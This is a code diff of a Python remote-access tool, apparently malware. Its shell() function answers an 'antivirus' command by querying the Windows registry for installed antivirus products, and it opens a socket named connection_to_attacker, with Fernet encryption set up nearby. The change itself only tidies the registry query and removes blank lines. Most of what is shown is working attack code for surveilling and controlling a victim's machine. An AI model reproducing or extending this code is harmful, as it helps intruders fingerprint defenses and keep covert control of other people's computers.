@@ -361,7 +361,8 @@ def shell():
 
         elif command == 'antivirus':
             try:
-                execute = subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av', '//s'], shell=True, stdout=subprocess.PIPE, 
+                reg_key='HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av'
+                execute = subprocess.run(['reg', 'query', reg_key, '/s'], shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
                 result = execute.stdout + execute.stderr
@@ -521,8 +522,6 @@ def shell():
 
 connection_to_attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
-
-
 """
 key = Fernet.generate_key()
 encryption_type = Fernet(key)
